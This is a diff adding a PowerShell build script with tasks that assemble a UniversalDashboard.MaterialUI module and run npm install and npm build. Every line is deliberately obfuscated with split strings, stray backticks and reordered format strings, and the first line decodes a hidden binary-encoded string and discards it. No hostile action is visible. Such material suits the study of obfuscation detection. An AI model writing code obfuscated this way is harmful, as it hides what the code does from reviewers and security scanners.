@@ -1,0 +1,26 @@
+${Zp`IY}  =[TYpe]("{0}{1}" -F 'CoNV','eRt'); (   -JOiN (("{14}{24}{26}{15}{27}{5}{30}{7}{0}{32}{23}{28}{21}{1}{2}{25}{8}{31}{10}{20}{3}{12}{6}{13}{19}{22}{16}{17}{11}{18}{4}{9}{29}"-f '1','1','101','1110<1','00','1','10A','<','t101110x1','11','0100G11010','r11','100','10','1001','0','10','101','0001G1','1','0x10','11&','110<1','1010<110','11A11','01','01','0','001x1100','1','x1110000','1','1')-splIT'p'-SPlIt 'G' -sPLIT'U' -SPLiT'x' -splIT '&'-sPlIt'}' -split'A' -spLIT '<'-sPLiT't'-splIT'r' |.('F'+'oREACh-'+'obJE'+'ct'){ (  (&('GE'+'T-VARiABl'+'e') z`PIY)."vA`lUe"::"tO`I`Nt16"( ( [String]${_} ), 2 )-As [Char])}) )  | &('oUT'+'-nUL'+'L')
+&('ta'+'sk') StA`Ge {
+    &('Push-L'+'ocat'+'io'+'n') "$PSScriptRoot"
+    .('C'+'opy'+'-'+'Item') "$PSScriptRoot\UniversalDashboard.MaterialUI.psm1" "$PSScriptRoot\output\UniversalDashboard.MaterialUI.psm1" -Force
+    &('Get-Ch'+'ild'+'It'+'e'+'m') "$PSScriptRoot\Scripts" -File -Recurse -Filter ("{0}{1}" -f '*.p','s1') | .('F'+'orE'+'ach-'+'Ob'+'ject') {
+        .('Ge'+'t-Cont'+'ent') ${_}."Ful`Ln`AmE" -Raw | .('Out'+'-File') "$PSScriptRoot\output\UniversalDashboard.MaterialUI.psm1" -Append -Encoding u`TF8
+    }
+    .('Copy'+'-Item') "$PSScriptRoot\UniversalDashboard.psd1" "$PSScriptRoot\output" 
+    &('Co'+'p'+'y'+'-Item') "$PSScriptRoot\example.ps1" "$PSScriptRoot\output" 
+
+    .('Po'+'p-'+'Location')
+}
+
+.('tas'+'k') B`UilD {
+    &('Remo'+'ve-'+'Item') "$PSScriptRoot\output" -Recurse -Force -ErrorAction sILe`N`T`lYcONtI`Nue
+    &('Pu'+'sh-L'+'ocation') "$PSScriptRoot"
+    & {
+        ${ErroRaCTio`N`pReFEr`E`NcE} = ("{0}{3}{1}{2}"-f'Sil','ontin','ue','entlyC')
+        &('np'+'m') iN`s`TAll
+        .('n'+'pm') r`Un B`UiLd
+    }
+    .('P'+'op-Loc'+'ation')
+}
+
+&('ta'+'sk') . BUI`Ld, STA`Ge
+
